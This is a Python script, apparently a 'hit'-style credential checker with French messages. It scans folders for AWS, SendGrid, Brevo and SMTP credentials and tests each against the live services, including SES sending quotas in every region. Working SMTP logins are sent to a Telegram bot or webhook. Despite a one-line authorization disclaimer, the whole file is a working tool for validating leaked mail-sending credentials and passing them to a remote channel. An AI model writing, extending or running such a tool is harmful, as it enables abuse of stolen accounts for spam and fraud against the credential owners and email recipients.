#!/usr/bin/env python3
"""
Scan a user-selected folder for text files, extract AWS / SendGrid / Brevo / SMTP
credentials, verify them, print hit-style reports, and notify Telegram on SMTP hits.

Requires: pip install requests boto3 botocore

Environment (optional):
  TELEGRAM_BOT_TOKEN + TELEGRAM_CHAT_ID  → sendMessage
  TELEGRAM_WEBHOOK_URL                  → POST JSON {"text": "..."} or Telegram body

Use only on data you are authorized to audit.
"""

from __future__ import annotations

import argparse
import html
import os
import re
import smtplib
import ssl
import sys
import uuid
from pathlib import Path
from typing import Any, Iterable

try:
    import requests
except ImportError:
    requests = None  # type: ignore

try:
    import boto3
    from botocore.exceptions import ClientError
except ImportError:
    boto3 = None  # type: ignore
    ClientError = Exception  # type: ignore

TEXT_SUFFIXES = {".txt", ".log", ".env", ".ini", ".cfg", ".conf", ".yaml", ".yml", ".json", ".csv", ".md"}

# AWS access key id (20 chars): AKIA (long-term) or ASIA (session)
AWS_ACCESS_KEY_RE = re.compile(r"\b((?:AKIA|ASIA)[0-9A-Z]{16})\b")
AWS_SECRET_RE = re.compile(r"\b([A-Za-z0-9/+=]{40})\b")

SENDGRID_KEY_RE = re.compile(r"\b(SG\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)\b")

BREVO_KEY_RE = re.compile(r"\b(xkeysib-[a-zA-Z0-9\-]{50,})\b")

# SMTP: host:port:user:pass or smtp://user:pass@host:port
SMTP_COLON_RE = re.compile(
    r"(?i)\b(smtp[a-z0-9.-]*\.[a-z0-9.-]+|\d{1,3}(?:\.\d{1,3}){3})\s*[:|]\s*(\d{2,5})\s*[:|]\s*([^\s:|]+)\s*[:|]\s*([^\s\r\n]+)"
)
SMTP_URL_RE = re.compile(
    r"(?i)\bsmtp(?:s)?://([^:]+):([^@]+)@([^:/]+)(?::(\d+))?\b"
)

# KEY=value blocks
SMTP_ENV_RE = re.compile(
    r"(?i)(?:SMTP|MAIL)_?(?:HOST|SERVER)\s*[=:]\s*([^\s\r\n]+).{0,200}?"
    r"(?:SMTP|MAIL)_?(?:PORT)\s*[=:]\s*(\d+).{0,200}?"
    r"(?:SMTP|MAIL)_?(?:USER|USERNAME|LOGIN)\s*[=:]\s*([^\s\r\n]+).{0,200}?"
    r"(?:SMTP|MAIL)_?(?:PASS(?:WORD)?)\s*[=:]\s*([^\s\r\n]+)",
    re.DOTALL,
)

AWS_SES_REGIONS = [
    "us-east-1",
    "us-east-2",
    "us-west-1",
    "us-west-2",
    "af-south-1",
    "ap-east-1",
    "ap-south-1",
    "ap-south-2",
    "ap-southeast-1",
    "ap-southeast-2",
    "ap-southeast-3",
    "ap-southeast-4",
    "ap-northeast-1",
    "ap-northeast-2",
    "ap-northeast-3",
    "ca-central-1",
    "eu-central-1",
    "eu-central-2",
    "eu-west-1",
    "eu-west-2",
    "eu-west-3",
    "eu-north-1",
    "eu-south-1",
    "eu-south-2",
    "il-central-1",
    "me-central-1",
    "me-south-1",
    "sa-east-1",
    "us-gov-east-1",
    "us-gov-west-1",
]


def hit_banner(service: str, status: str, details: dict[str, Any]) -> str:
    hid = str(uuid.uuid4())[:8].upper()
    lines = [
        f"🔥 HIT [{hid}] | {service} | {status}",
        "─" * 48,
    ]
    for k, v in details.items():
        if v is None:
            continue
        lines.append(f"  ▸ {k}: {v}")
    lines.append("─" * 48)
    return "\n".join(lines)


def pick_folder_gui() -> Path | None:
    try:
        import tkinter as tk
        from tkinter import filedialog
    except ImportError:
        return None
    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True)
    path = filedialog.askdirectory(title="Choisir le dossier à analyser")
    root.destroy()
    if not path:
        return None
    return Path(path)


def iter_text_files(root: Path) -> Iterable[Path]:
    for p in root.rglob("*"):
        if not p.is_file():
            continue
        if p.suffix.lower() in TEXT_SUFFIXES or p.suffix == "":
            try:
                if p.stat().st_size > 5_000_000:
                    continue
            except OSError:
                continue
            yield p


def read_text_safe(path: Path) -> str:
    for enc in ("utf-8", "latin-1", "cp1252"):
        try:
            return path.read_text(encoding=enc, errors="replace")
        except OSError:
            return ""
    return ""


def _looks_like_aws_secret(s: str) -> bool:
    if len(s) != 40:
        return False
    if s.isalnum() and not any(c.isdigit() for c in s):
        return False
    if s.isalnum() and not any(c.isalpha() for c in s):
        return False
    return True


def pair_aws_keys(text: str) -> list[tuple[str, str]]:
    """Pair access keys with nearby 40-char secrets (same line or next 500 chars)."""
    found: list[tuple[str, str]] = []
    seen: set[tuple[str, str]] = set()
    for m in AWS_ACCESS_KEY_RE.finditer(text):
        ak = m.group(1)
        window = text[m.start() : m.start() + 500]
        for sm in AWS_SECRET_RE.finditer(window):
            sk = sm.group(1)
            if sk == ak or not _looks_like_aws_secret(sk):
                continue
            pair = (ak, sk)
            if pair not in seen:
                seen.add(pair)
                found.append(pair)
    return found


def extract_sendgrid(text: str) -> set[str]:
    return set(SENDGRID_KEY_RE.findall(text))


def extract_brevo(text: str) -> set[str]:
    return set(BREVO_KEY_RE.findall(text))


def extract_smtp(text: str) -> list[tuple[str, int, str, str]]:
    out: list[tuple[str, int, str, str]] = []
    seen: set[tuple[str, int, str, str]] = set()
    for host, port, user, pw in SMTP_COLON_RE.findall(text):
        try:
            p = int(port)
        except ValueError:
            continue
        t = (host.lower(), p, user, pw)
        if t not in seen:
            seen.add(t)
            out.append((host, p, user, pw))
    for user, pw, host, port in SMTP_URL_RE.findall(text):
        try:
            p = int(port) if port else 587
        except ValueError:
            p = 587
        t = (host.lower(), p, user, pw)
        if t not in seen:
            seen.add(t)
            out.append((host, p, user, pw))
    for m in SMTP_ENV_RE.finditer(text):
        host, port, user, pw = m.group(1), m.group(2), m.group(3), m.group(4)
        try:
            p = int(port)
        except ValueError:
            continue
        t = (host.lower(), p, user.strip(), pw.strip())
        if t not in seen:
            seen.add(t)
            out.append((host.strip(), p, user.strip(), pw.strip()))
    return out


def telegram_notify(text: str, timeout: int = 15) -> bool:
    if not requests:
        return False
    url = os.environ.get("TELEGRAM_WEBHOOK_URL")
    token = os.environ.get("TELEGRAM_BOT_TOKEN")
    chat_id = os.environ.get("TELEGRAM_CHAT_ID")
    if url:
        # Generic webhook: try simple JSON first
        for payload in (
            {"text": text},
            {"message": text},
            {"chat_id": chat_id, "text": text} if chat_id else None,
        ):
            if payload is None:
                continue
            try:
                r = requests.post(url, json=payload, timeout=timeout)
                if r.status_code < 400:
                    return True
            except OSError:
                continue
        return False
    if token and chat_id:
        api = f"https://api.telegram.org/bot{token}/sendMessage"
        try:
            safe = html.escape(text[:4000])
            r = requests.post(
                api,
                json={"chat_id": chat_id, "text": safe, "parse_mode": "HTML"},
                timeout=timeout,
            )
            return r.status_code < 400
        except OSError:
            return False
    return False


def verify_aws(ak: str, sk: str) -> dict[str, Any]:
    if not boto3:
        return {"ok": False, "error": "boto3 non installé"}
    try:
        sts = boto3.client(
            "sts",
            aws_access_key_id=ak,
            aws_secret_access_key=sk,
            region_name="us-east-1",
        )
        ident = sts.get_caller_identity()
        arn = ident.get("Arn", "")
        account = ident.get("Account", "")
    except ClientError as e:
        return {"ok": False, "error": str(e)}
    except OSError as e:
        return {"ok": False, "error": str(e)}

    regions = list(AWS_SES_REGIONS)
    try:
        extra = boto3.session.Session().get_available_regions("ses")
        for r in extra:
            if r not in regions:
                regions.append(r)
    except (AttributeError, TypeError, ValueError, OSError):
        pass

    quotas: dict[str, Any] = {}
    for region in regions:
        try:
            ses = boto3.client(
                "ses",
                aws_access_key_id=ak,
                aws_secret_access_key=sk,
                region_name=region,
            )
            q = ses.get_send_quota()
            quotas[region] = {
                "Max24HourSend": q.get("Max24HourSend"),
                "SentLast24Hours": q.get("SentLast24Hours"),
                "MaxSendRate": q.get("MaxSendRate"),
            }
        except ClientError:
            continue
        except OSError:
            break

    return {"ok": True, "arn": arn, "account": account, "ses_quotas": quotas}


def verify_sendgrid(api_key: str) -> dict[str, Any]:
    if not requests:
        return {"ok": False, "error": "requests non installé"}
    try:
        r = requests.get(
            "https://api.sendgrid.com/v3/user/credits",
            headers={"Authorization": f"Bearer {api_key}"},
            timeout=20,
        )
        if r.status_code == 200:
            data = r.json()
            return {"ok": True, "credits": data}
        return {"ok": False, "status": r.status_code, "body": r.text[:200]}
    except OSError as e:
        return {"ok": False, "error": str(e)}


def verify_brevo(api_key: str) -> dict[str, Any]:
    if not requests:
        return {"ok": False, "error": "requests non installé"}
    try:
        r = requests.get(
            "https://api.brevo.com/v3/account",
            headers={"api-key": api_key},
            timeout=20,
        )
        if r.status_code == 200:
            data = r.json()
            plan = data.get("plan", [])
            credits = data.get("credits")
            email = data.get("email")
            return {"ok": True, "email": email, "plan": plan, "credits": credits, "raw_keys": list(data.keys())[:12]}
        return {"ok": False, "status": r.status_code, "body": r.text[:200]}
    except OSError as e:
        return {"ok": False, "error": str(e)}


def verify_smtp(host: str, port: int, user: str, password: str) -> dict[str, Any]:
    context = ssl.create_default_context()
    try:
        if port == 465:
            with smtplib.SMTP_SSL(host, port, timeout=25, context=context) as s:
                s.login(user, password)
        else:
            with smtplib.SMTP(host, port, timeout=25) as s:
                s.ehlo()
                if s.has_extn("STARTTLS"):
                    s.starttls(context=context)
                    s.ehlo()
                s.login(user, password)
        return {"ok": True}
    except OSError as e:
        return {"ok": False, "error": str(e)}
    except smtplib.SMTPException as e:
        return {"ok": False, "error": str(e)}


def scan_directory(root: Path, dry_notify: bool) -> int:
    aws_pairs: set[tuple[str, str]] = set()
    sendgrid: set[str] = set()
    brevo: set[str] = set()
    smtp_seen: set[tuple[str, int, str, str]] = set()
    smtp_list: list[tuple[str, int, str, str]] = []

    for fp in iter_text_files(root):
        body = read_text_safe(fp)
        if not body:
            continue
        for ak, sk in pair_aws_keys(body):
            aws_pairs.add((ak, sk))
        for k in extract_sendgrid(body):
            sendgrid.add(k)
        for k in extract_brevo(body):
            brevo.add(k)
        for row in extract_smtp(body):
            h, p, u, pw = row
            key = (h.lower(), p, u, pw)
            if key not in smtp_seen:
                smtp_seen.add(key)
                smtp_list.append(row)

    hits = 0

    for ak, sk in aws_pairs:
        r = verify_aws(ak, sk)
        if r.get("ok"):
            hits += 1
            ses_summary = r.get("ses_quotas") or {}
            regions_ok = [reg for reg, q in ses_summary.items() if q]
            detail = {
                "account": r.get("account"),
                "arn": r.get("arn"),
                "regions_ses_ok": len(regions_ok),
                "sample_quota": next(iter(ses_summary.values()), None),
            }
            print(hit_banner("AWS", "LIVE", detail))
        else:
            print(hit_banner("AWS", "DEAD", {"access_key": ak[:8] + "…", "error": r.get("error", r)}))

    for sg in sendgrid:
        r = verify_sendgrid(sg)
        if r.get("ok"):
            hits += 1
            print(hit_banner("SENDGRID", "LIVE", {"quota": r.get("credits"), "key": sg[:12] + "…"}))
        else:
            print(hit_banner("SENDGRID", "DEAD", {"key": sg[:12] + "…", "error": r.get("error", r.get("status"))}))

    for br in brevo:
        r = verify_brevo(br)
        if r.get("ok"):
            hits += 1
            print(
                hit_banner(
                    "BREVO",
                    "LIVE",
                    {"email": r.get("email"), "credits": r.get("credits"), "key": br[:16] + "…"},
                )
            )
        else:
            print(hit_banner("BREVO", "DEAD", {"key": br[:16] + "…", "error": r.get("error", r.get("status"))}))

    for host, port, user, pw in smtp_list:
        r = verify_smtp(host, port, user, pw)
        if r.get("ok"):
            hits += 1
            msg = hit_banner("SMTP", "LIVE", {"host": host, "port": port, "user": user})
            print(msg)
            if dry_notify:
                print("  (TELEGRAM skip: --dry-telegram)")
            else:
                ok = telegram_notify(f"<pre>{html.escape(msg)}</pre>")
                print(f"  ▸ telegram_sent: {ok}")
        else:
            print(hit_banner("SMTP", "DEAD", {"host": host, "port": port, "user": user, "error": r.get("error")}))

    print(f"\nRésumé: {hits} credential(s) fonctionnelle(s) détectée(s).")
    return hits


def main() -> int:
    ap = argparse.ArgumentParser(description="Scanner dossier + credentials + checks")
    ap.add_argument("--dir", type=Path, help="Dossier à analyser (sinon dialogue graphique)")
    ap.add_argument("--dry-telegram", action="store_true", help="Ne pas envoyer Telegram même si SMTP OK")
    args = ap.parse_args()

    root = args.dir
    if root is None:
        root = pick_folder_gui()
    if root is None or not root.is_dir():
        print("Dossier invalide ou annulé.", file=sys.stderr)
        return 2

    if not requests:
        print("Installez requests: pip install requests", file=sys.stderr)
    if not boto3:
        print("Pour AWS installez boto3: pip install boto3", file=sys.stderr)

    scan_directory(root.resolve(), dry_notify=args.dry_telegram)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
